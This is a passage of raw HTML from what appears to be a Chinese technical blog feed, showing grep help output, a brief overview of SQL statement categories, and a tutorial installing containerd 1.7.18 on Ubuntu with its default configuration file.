class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan kubeconfig]<span class="hljs-comment"># grep --help</span><br>Usage: grep [OPTION]... PATTERN [FILE]...<br>Search <span class="hljs-keyword">for</span> PATTERN <span class="hljs-keyword">in</span> each FILE.<br>Example: grep -i <span class="hljs-string">&#x27;hello world&#x27;</span> menu.h main.c<br><br>Pattern selection and interpretation:<br>  -E, --extended-regexp     PATTERN is an extended regular expression<br>  -F, --fixed-strings       PATTERN is a <span class="hljs-built_in">set</span> of newline-separated strings<br>  -G, --basic-regexp        PATTERN is a basic regular expression (default)<br>  -P, --perl-regexp         PATTERN is a Perl regular expression<br>  -e, --regexp=PATTERN      use PATTERN <span class="hljs-keyword">for</span> matching<br>  -f, --file=FILE           obtain PATTERN from FILE<br>  -i, --ignore-case         ignore <span class="hljs-keyword">case</span> distinctions<br>  -w, --word-regexp         force PATTERN to match only whole words<br>  -x, --line-regexp         force PATTERN to match only whole lines<br>  -z, --null-data           a data line ends <span class="hljs-keyword">in</span> 0 byte, not newline<br><br>Miscellaneous:<br>  -s, --no-messages         suppress error messages<br>  -v, --invert-match        select non-matching lines<br>  -V, --version             display version information and <span class="hljs-built_in">exit</span><br>      --<span class="hljs-built_in">help</span>                display this <span class="hljs-built_in">help</span> text and <span class="hljs-built_in">exit</span><br><br>Output control:<br>  -m, --max-count=NUM       stop after NUM selected lines<br>  -b, --byte-offset         <span class="hljs-built_in">print</span> the byte offset with output lines<br>  -n, --line-number         <span class="hljs-built_in">print</span> line number with output lines<br>      --line-buffered       flush output on every line<br>  -H, --with-filename       <span class="hljs-built_in">print</span> file name with output lines<br>  -h, --no-filename         suppress the file name prefix on output<br>      --label=LABEL         use LABEL as the standard input file name prefix<br>  -o, --only-matching       show only the part of a line matching PATTERN<br>  -q, --quiet, --silent     suppress all normal output<br>      --binary-files=TYPE   assume that binary files are TYPE;<br>                            TYPE is <span class="hljs-string">&#x27;binary&#x27;</span>, <span class="hljs-string">&#x27;text&#x27;</span>, or <span class="hljs-string">&#x27;without-match&#x27;</span><br>  -a, --text                equivalent to --binary-files=text<br>  -I                        equivalent to --binary-files=without-match<br>  -d, --directories=ACTION  how to handle directories;<br>                            ACTION is <span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;recurse&#x27;</span>, or <span class="hljs-string">&#x27;skip&#x27;</span><br>  -D, --devices=ACTION      how to handle devices, FIFOs and sockets;<br>                            ACTION is <span class="hljs-string">&#x27;read&#x27;</span> or <span class="hljs-string">&#x27;skip&#x27;</span><br>  -r, --recursive           like --directories=recurse<br>  -R, --dereference-recursive  likewise, but follow all symlinks<br>      --include=FILE_PATTERN  search only files that match FILE_PATTERN<br>      --exclude=FILE_PATTERN  skip files and directories matching FILE_PATTERN<br>      --exclude-from=FILE   skip files matching any file pattern from FILE<br>      --exclude-dir=PATTERN  directories that match PATTERN will be skipped.<br>  -L, --files-without-match  <span class="hljs-built_in">print</span> only names of FILEs with no selected lines<br>  -l, --files-with-matches  <span class="hljs-built_in">print</span> only names of FILEs with selected lines<br>  -c, --count               <span class="hljs-built_in">print</span> only a count of selected lines per FILE<br>  -T, --initial-tab         make tabs line up (<span class="hljs-keyword">if</span> needed)<br>  -Z, --null                <span class="hljs-built_in">print</span> 0 byte after FILE name<br></code></pre></td></tr></table></figure><p>SQL语言共分为四大类：数据定义语言DDL，数据操纵语言DML，数据查询语言DQL，数据控制语言DCL。 </p><ol><li>数据定义语言DDL</li></ol><p> 数据定义语言DDL用来创建数据库中的各种对象—–表、视图、索引、同义词、聚簇等如： </p><p> CREATE TABLE&#x2F;VIEW&#x2F;INDEX&#x2F;SYN&#x2F;CLUSTER </p><p> DDL操作是隐性提交的！不能rollback </p><p> 2 .数据操纵语言DML </p><p> 数据操纵语言DML主要有三种形式： </p><ol><li><p>插入：INSERT </p></li><li><p>更新：UPDATE </p></li><li><p>删除：DELETE</p></li></ol><ol start="3"><li>数据查询语言DQL</li></ol><p> 数据查询语言DQL基本结构是由SELECT子句，FROM子句，WHERE子句组成的查询块： </p><p> SELECT &lt;字段名表&gt; </p><p> FROM &lt;表或视图名&gt; </p><p> WHERE &lt;查询条件&gt; </p><ol start="4"><li>数据控制语言DCL</li></ol><p> 数据控制语言DCL用来授予或回收访问数据库的某种特权，并控制数据库操纵事务发生的时间及效果，对数据库实行监视等。如： </p><ol><li><p>GRANT：授权。 </p></li><li><p>ROLLBACK [WORK] TO [SAVEPOINT]：回退到某一点。</p></li></ol><p> 回滚—ROLLBACK </p><p> 回滚命令使数据库状态回到上次最后提交的状态。其格式为： </p><p> SQL&gt;ROLLBACK  </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【containerd】(202407) 01.安装containerd</title>
    <link href="/2024/07/29/containerd/%E3%80%90containerd%E3%80%91(202407)%2001.%E5%AE%89%E8%A3%85containerd/"/>
    <url>/2024/07/29/containerd/%E3%80%90containerd%E3%80%91(202407)%2001.%E5%AE%89%E8%A3%85containerd/</url>
    
    <content type="html"><![CDATA[<h1 id="安装containerd"><a href="#安装containerd" class="headerlink" title="安装containerd"></a>安装containerd</h1><h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># uname -a</span><br>Linux ubuntu-22 6.5.0-41-generic <span class="hljs-comment">#41~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Mon Jun  3 11:32:55 UTC 2 x86_64 x86_64 x86_64 GNU/Linux</span><br></code></pre></td></tr></table></figure><h2 id="下载安装containerd"><a href="#下载安装containerd" class="headerlink" title="下载安装containerd"></a>下载安装containerd</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># wget https://github.com/containerd/containerd/releases/download/v1.7.18/cri-containerd-cni-1.7.18-linux-amd64.tar.gz</span><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># tar -xvf cri-containerd-cni-1.7.18-linux-amd64.tar.gz -C /</span><br>cri-containerd.DEPRECATED.txt<br>etc/<br>etc/systemd/<br>etc/systemd/system/<br>etc/systemd/system/containerd.service<br>etc/cni/<br>etc/cni/net.d/<br>etc/cni/net.d/10-containerd-net.conflist<br>etc/crictl.yaml<br>usr/<br>usr/local/<br>usr/local/sbin/<br>usr/local/sbin/runc<br>usr/local/bin/<br>usr/local/bin/containerd-shim<br>usr/local/bin/crictl<br>usr/local/bin/containerd-stress<br>usr/local/bin/critest<br>usr/local/bin/ctr<br>usr/local/bin/ctd-decoder<br>usr/local/bin/containerd-shim-runc-v2<br>usr/local/bin/containerd-shim-runc-v1<br>usr/local/bin/containerd<br>opt/<br>opt/cni/<br>opt/cni/bin/<br>opt/cni/bin/tuning<br>opt/cni/bin/firewall<br>opt/cni/bin/loopback<br>opt/cni/bin/macvlan<br>opt/cni/bin/ptp<br>opt/cni/bin/bridge<br>opt/cni/bin/static<br>opt/cni/bin/dhcp<br>opt/cni/bin/dummy<br>opt/cni/bin/sbr<br>opt/cni/bin/vrf<br>opt/cni/bin/host-local<br>opt/cni/bin/bandwidth<br>opt/cni/bin/vlan<br>opt/cni/bin/host-device<br>opt/cni/bin/portmap<br>opt/cni/bin/ipvlan<br>opt/containerd/<br>opt/containerd/cluster/<br>opt/containerd/cluster/version<br>opt/containerd/cluster/gce/<br>opt/containerd/cluster/gce/configure.sh<br>opt/containerd/cluster/gce/env<br>opt/containerd/cluster/gce/cloud-init/<br>opt/containerd/cluster/gce/cloud-init/master.yaml<br>opt/containerd/cluster/gce/cloud-init/node.yaml<br>opt/containerd/cluster/gce/cni.template<br><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># mkdir -p /etc/containerd</span><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># containerd config default &gt; /etc/containerd/config.toml</span><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># systemctl start containerd</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># systemctl enable containerd</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># systemctl status containerd</span><br>● containerd.service - containerd container runtime<br>     Loaded: loaded (/etc/systemd/system/containerd.service; enabled; vendor preset: enabled)<br>     Active: active (running) since Mon 2024-07-08 20:41:42 CST; 8s ago<br>       Docs: https://containerd.io<br>   Main PID: 36771 (containerd)<br>      Tasks: 8<br>     Memory: 9.2M<br>        CPU: 89ms<br>     CGroup: /system.slice/containerd.service<br>             └─36771 /usr/local/bin/containerd<br><br>7月 08 20:41:42 ubuntu-22 containerd[36771]: time=<span class="hljs-string">&quot;2024-07-08T20:41:42.765403283+08:00&quot;</span> level=info msg=<span class="hljs-string">&quot;Start subscribing containerd event&quot;</span><br>7月 08 20:41:42 ubuntu-22 containerd[36771]: time=<span class="hljs-string">&quot;2024-07-08T20:41:42.765841560+08:00&quot;</span> level=info msg=<span class="hljs-string">&quot;Start recovering state&quot;</span><br>7月 08 20:41:42 ubuntu-22 containerd[36771]: time=<span class="hljs-string">&quot;2024-07-08T20:41:42.765436975+08:00&quot;</span> level=info msg=serving... address=/run/containerd/containerd.sock.ttrpc<br>7月 08 20:41:42 ubuntu-22 containerd[36771]: time=<span class="hljs-string">&quot;2024-07-08T20:41:42.766984892+08:00&quot;</span> level=info msg=<span class="hljs-string">&quot;Start event monitor&quot;</span><br>7月 08 20:41:42 ubuntu-22 containerd[36771]: time=<span class="hljs-string">&quot;2024-07-08T20:41:42.767354311+08:00&quot;</span> level=info msg=<span class="hljs-string">&quot;Start snapshots syncer&quot;</span><br>7月 08 20:41:42 ubuntu-22 containerd[36771]: time=<span class="hljs-string">&quot;2024-07-08T20:41:42.767367946+08:00&quot;</span> level=info msg=<span class="hljs-string">&quot;Start cni network conf syncer for default&quot;</span><br>7月 08 20:41:42 ubuntu-22 containerd[36771]: time=<span class="hljs-string">&quot;2024-07-08T20:41:42.767378325+08:00&quot;</span> level=info msg=<span class="hljs-string">&quot;Start streaming server&quot;</span><br>7月 08 20:41:42 ubuntu-22 containerd[36771]: time=<span class="hljs-string">&quot;2024-07-08T20:41:42.767648701+08:00&quot;</span> level=info msg=serving... address=/run/containerd/containerd.sock<br>7月 08 20:41:42 ubuntu-22 containerd[36771]: time=<span class="hljs-string">&quot;2024-07-08T20:41:42.767846800+08:00&quot;</span> level=info msg=<span class="hljs-string">&quot;containerd successfully booted in 0.046182s&quot;</span><br>7月 08 20:41:42 ubuntu-22 systemd[1]: Started containerd container runtime.<br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h2 id="查看状态"><a href="#查看状态" class="headerlink" title="查看状态"></a>查看状态</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>[root@ubuntu-22 ~]<span class="hljs-comment"># ctr version</span><br>Client:<br>  Version:  v1.7.18<br>  Revision: ae71819c4f5e67bb4d5ae76a6b735f29cc25774e<br>  Go version: go1.21.11<br><br>Server:<br>  Version:  v1.7.18<br>  Revision: ae71819c4f5e67bb4d5ae76a6b735f29cc25774e<br>  UUID: 64bd2d8f-d225-40aa-82fd-874a0a06032b<br></code></pre></td></tr></table></figure><h2 id="查看默认配置"><a href="#查看默认配置" class="headerlink" title="查看默认配置"></a>查看默认配置</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># cat /etc/containerd/config.toml </span><br>disabled_plugins = []<br>imports = []<br>oom_score = 0<br>plugin_dir = <span class="hljs-string">&quot;&quot;</span><br>required_plugins = []<br>root = <span class="hljs-string">&quot;/var/lib/containerd&quot;</span><br>state = <span class="hljs-string">&quot;/run/containerd&quot;</span><br>temp = <span class="hljs-string">&quot;&quot;</span><br>version = 2<br><br>[cgroup]<br>  path = <span class="hljs-string">&quot;&quot;</span><br><br>[debug]<br>  address = <span class="hljs-string">&quot;&quot;</span><br>  format = <span class="hljs-string">&quot;&quot;</span><br>  gid = 0<br>  level = <span class="hljs-string">&quot;&quot;</span><br>  uid = 0<br><br>[grpc]<br>  address = <span class="hljs-string">&quot;/run/containerd/containerd.sock&quot;</span><br>  gid = 0<br>  max_recv_message_size = 16777216<br>  max_send_message_size = 16777216<br>  tcp_address = <span class="hljs-string">&quot;&quot;</span><br>  tcp_tls_ca = <span class="hljs-string">&quot;&quot;</span><br>  tcp_tls_cert = <span class="hljs-string">&quot;&quot;</span><br>  tcp_tls_key = <span class="hljs-string">&quot;&quot;</span><br>  uid = 0<br><br>[metrics]<br>  address = <span class="hljs-string">&quot;&quot;</span><br>  grpc_histogram = <span class="hljs-literal">false</span><br><br>[plugins]<br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.gc.v1.scheduler&quot;</span>]<br>    deletion_threshold = 0<br>    mutation_threshold = 100<br>    pause_threshold = 0.02<br>    schedule_delay = <span class="hljs-string">&quot;0s&quot;</span><br>    startup_delay = <span class="hljs-string">&quot;100ms&quot;</span><br><br>  [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>]<br>    cdi_spec_dirs = [<span class="hljs-string">&quot;/etc/cdi&quot;</span>, <span class="hljs-string">&quot;/var/run/cdi&quot;</span>]<br>    device_ownership_from_security_context = <span class="hljs-literal">false</span><br>    disable_apparmor = <span class="hljs-literal">false</span><br>    disable_cgroup = <span class="hljs-literal">false</span><br>    disable_hugetlb_controller = <span class="hljs-literal">true</span><br>    disable_proc_mount = <span class="hljs-literal">false</span><br>    disable_tcp_service = <span class="hljs-literal">true</span><br>    drain_exec_sync_io_timeout = <span class="hljs-string">&quot;0s&quot;</span><br>    enable_cdi = <span class="hljs-literal">false</span><br>    enable_selinux = <span class="hljs-literal">false</span><br>    enable_tls_streaming = <span class="hljs-literal">false</span><br>    enable_unprivileged_icmp = <span class="hljs-literal">false</span><br>    enable_unprivileged_ports = <span class="hljs-literal">false</span><br>    ignore_deprecation_warnings = []<br>    ignore_image_defined_volumes = <span class="hljs-literal">false</span><br>    image_pull_progress_timeout = <span class="hljs-string">&quot;5m0s&quot;</span><br>    image_pull_with_sync_fs = <span class="hljs-literal">false</span><br>    max_concurrent_downloads = 3<br>    max_container_log_line_size = 16384<br>    netns_mounts_under_state_dir = <span class="hljs-literal">false</span><br>    restrict_oom_score_adj = <span class="hljs-literal">false</span><br>    sandbox_image = <span class="hljs-string">&quot;registry.k8s.io/pause:3.8&quot;</span><br>    selinux_category_range = 1024<br>    stats_collect_period = 10<br>    stream_idle_timeout = <span class="hljs-string">&quot;4h0m0s&quot;</span><br>    stream_server_address = <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>    stream_server_port = <span class="hljs-string">&quot;0&quot;</span><br>    systemd_cgroup = <span class="hljs-literal">false</span><br>    tolerate_missing_hugetlb_controller = <span class="hljs-literal">true</span><br>    unset_seccomp_profile = <span class="hljs-string">&quot;&quot;</span><br><br>    [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.cni]<br>      bin_dir = <span class="hljs-string">&quot;/opt/cni/bin&quot;</span><br>      conf_dir = <span class="hljs-string">&quot;/etc/cni/net.d&quot;</span><br>      conf_template = <span class="hljs-string">&quot;&quot;</span><br>      ip_pref = <span class="hljs-string">&quot;&quot;</span><br>      max_conf_num = 1<br>      setup_serially = <span class="hljs-literal">false</span><br><br>    [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.containerd]<br>      default_runtime_name = <span class="hljs-string">&quot;runc&quot;</span><br>      disable_snapshot_annotations = <span class="hljs-literal">true</span><br>      discard_unpacked_layers = <span class="hljs-literal">false</span><br>      ignore_blockio_not_enabled_errors = <span class="hljs-literal">false</span><br>      ignore_rdt_not_enabled_errors = <span class="hljs-literal">false</span><br>      no_pivot = <span class="hljs-literal">false</span><br>      snapshotter = <span class="hljs-string">&quot;overlayfs&quot;</span><br><br>      [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.containerd.default_runtime]<br>        base_runtime_spec = <span class="hljs-string">&quot;&quot;</span><br>        cni_conf_dir = <span class="hljs-string">&quot;&quot;</span><br>        cni_max_conf_num = 0<br>        container_annotations = []<br>        pod_annotations = []<br>        privileged_without_host_devices = <span class="hljs-literal">false</span><br>        privileged_without_host_devices_all_devices_allowed = <span class="hljs-literal">false</span><br>        runtime_engine = <span class="hljs-string">&quot;&quot;</span><br>        runtime_path = <span class="hljs-string">&quot;&quot;</span><br>        runtime_root = <span class="hljs-string">&quot;&quot;</span><br>        runtime_type = <span class="hljs-string">&quot;&quot;</span><br>        sandbox_mode = <span class="hljs-string">&quot;&quot;</span><br>        snapshotter = <span class="hljs-string">&quot;&quot;</span><br><br>        [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.containerd.default_runtime.options]<br><br>      [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.containerd.runtimes]<br><br>        [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.containerd.runtimes.runc]<br>          base_runtime_spec = <span class="hljs-string">&quot;&quot;</span><br>          cni_conf_dir = <span class="hljs-string">&quot;&quot;</span><br>          cni_max_conf_num = 0<br>          container_annotations = []<br>          pod_annotations = []<br>          privileged_without_host_devices = <span class="hljs-literal">false</span><br>          privileged_without_host_devices_all_devices_allowed = <span class="hljs-literal">false</span><br>          runtime_engine = <span class="hljs-string">&quot;&quot;</span><br>          runtime_path = <span class="hljs-string">&quot;&quot;</span><br>          runtime_root = <span class="hljs-string">&quot;&quot;</span><br>          runtime_type = <span class="hljs-string">&quot;io.containerd.runc.v2&quot;</span><br>          sandbox_mode = <span class="hljs-string">&quot;podsandbox&quot;</span><br>          snapshotter = <span class="hljs-string">&quot;&quot;</span><br><br>          [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.containerd.runtimes.runc.options]<br>            BinaryName = <span class="hljs-string">&quot;&quot;</span><br>            CriuImagePath = <span class="hljs-string">&quot;&quot;</span><br>            CriuPath = <span class="hljs-string">&quot;&quot;</span><br>            CriuWorkPath = <span class="hljs-string">&quot;&quot;</span><br>            IoGid = 0<br>            IoUid = 0<br>            NoNewKeyring = <span class="hljs-literal">false</span><br>            NoPivotRoot = <span class="hljs-literal">false</span><br>            Root = <span class="hljs-string">&quot;&quot;</span><br>            ShimCgroup = <span class="hljs-string">&quot;&quot;</span><br>            SystemdCgroup = <span class="hljs-literal">false</span><br><br>      [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.containerd.untrusted_workload_runtime]<br>        base_runtime_spec = <span class="hljs-string">&quot;&quot;</span><br>        cni_conf_dir = <span class="hljs-string">&quot;&quot;</span><br>        cni_max_conf_num = 0<br>        container_annotations = []<br>        pod_annotations = []<br>        privileged_without_host_devices = <span class="hljs-literal">false</span><br>        privileged_without_host_devices_all_devices_allowed = <span class="hljs-literal">false</span><br>        runtime_engine = <span class="hljs-string">&quot;&quot;</span><br>        runtime_path = <span class="hljs-string">&quot;&quot;</span><br>        runtime_root = <span class="hljs-string">&quot;&quot;</span><br>        runtime_type = <span class="hljs-string">&quot;&quot;</span><br>        sandbox_mode = <span class="hljs-string">&quot;&quot;</span><br>        snapshotter = <span class="hljs-string">&quot;&quot;</span><br><br>        [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.containerd.untrusted_workload_runtime.options]<br><br>    [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.image_decryption]<br>      key_model = <span class="hljs-string">&quot;node&quot;</span><br><br>    [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.registry]<br>      config_path = <span class="hljs-string">&quot;&quot;</span><br><br>      [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.registry.auths]<br><br>      [plugins.<span class="hljs-string">&quot;io.containerd.grpc.v1.cri&quot;</span>.registry.configs]<br><br>      [plugins.<span 